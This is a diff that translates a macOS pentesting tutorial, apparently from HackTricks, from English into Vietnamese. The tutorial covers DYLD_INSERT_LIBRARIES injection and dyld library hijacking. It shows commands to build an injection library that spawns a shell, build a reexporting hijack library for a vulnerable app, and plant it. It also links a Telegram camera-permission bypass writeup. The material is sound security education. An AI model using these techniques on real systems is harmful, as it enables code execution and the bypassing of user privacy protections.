@@ -2,9 +2,9 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## DYLD_INSERT_LIBRARIES Basic example
+## Ví dụ cơ bản về DYLD_INSERT_LIBRARIES
 
-**Library to inject** to execute a shell:
+**Thư viện cần inject** để thực thi một shell:
 
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
@@ -24,7 +24,7 @@ void myconstructor(int argc, const char **argv)
 }
 ```
 
-Binary to attack:
+Binary cần tấn công:
 
 ```c
 // gcc hello.c -o hello
@@ -43,9 +43,9 @@ Injection:
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
 
-## Dyld Hijacking Example
+## Ví dụ về Dyld Hijacking
 
-The targeted vulnerable binary is `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+Binary dễ bị tấn công được nhắm mục tiêu là `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {{#tabs}}
 {{#tab name="entitlements"}}
@@ -87,12 +87,12 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-With the previous info we know that it's **not checking the signature of the loaded libraries** and it's **trying to load a library from**:
+Với thông tin trước đó, chúng ta biết rằng ứng dụng **không kiểm tra chữ ký của các library được tải** và **đang cố tải một library từ**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-However, the first one doesn't exist:
+Tuy nhiên, đường dẫn đầu tiên không tồn tại:
 
 ```bash
 pwd
@@ -102,7 +102,7 @@ find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
 
-So, it's possible to hijack it! Create a library that **executes some arbitrary code and exports the same functionalities** as the legit library by reexporting it. And remember to compile it with the expected versions:
+Vậy là có thể hijack nó! Tạo một thư viện **thực thi một đoạn code tùy ý và export các chức năng giống thư viện hợp pháp bằng cách reexport thư viện đó**. Và nhớ compile thư viện bằng các phiên bản cần thiết:
 
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
@@ -113,14 +113,14 @@ void custom(int argc, const char **argv) {
 }
 ```
 
-Compile it:
+Biên dịch nó:
 
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
 
-The reexport path created in the library is relative to the loader, lets change it for an absolute path to the library to export:
+Đường dẫn reexport được tạo trong thư viện là tương đối so với loader; hãy đổi nó thành đường dẫn tuyệt đối đến thư viện cần export:
 
 ```bash
 #Check relative
@@ -139,13 +139,13 @@ otool -l /tmp/lib.dylib| grep REEXPORT -A 2
          name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
 
-Finally just copy it to the **hijacked location**:
+Cuối cùng, chỉ cần sao chép nó vào **vị trí bị chiếm quyền**:
 
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
 
-And **execute** the binary and check the **library was loaded**:
+And **thực thi** binary và kiểm tra **library đã được tải**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
@@ -153,11 +153,11 @@ And **execute** the binary and check the **library was loaded**:
 </code></pre>
 
 > [!TIP]
-> A nice writeup about how to abuse this vulnerability to abuse the camera permissions of telegram can be found in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
+> Bạn có thể xem bài viết chi tiết này về cách khai thác lỗ hổng để lạm dụng quyền truy cập camera của Telegram: [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
 
-## Bigger Scale
+## Quy mô lớn hơn
 
-If you are planing on trying to inject libraries in unexpected binaries you could check the event messages to find out when the library is loaded inside a process (in this case remove the printf and the `/bin/bash` execution).
+Nếu bạn định inject library vào các binary không ngờ tới, bạn có thể kiểm tra các thông báo sự kiện để biết khi nào library được tải vào một process (trong trường hợp này, hãy xóa `printf` và lệnh thực thi `/bin/bash`).
 
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
@@ -165,6 +165,5 @@ sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"
 
 ## References
 
-- [1] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
-
+- [1] [CVE-2023-26818 - Vượt qua TCC bằng Telegram trên macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {{#include ../../../../banners/hacktricks-training.md}}
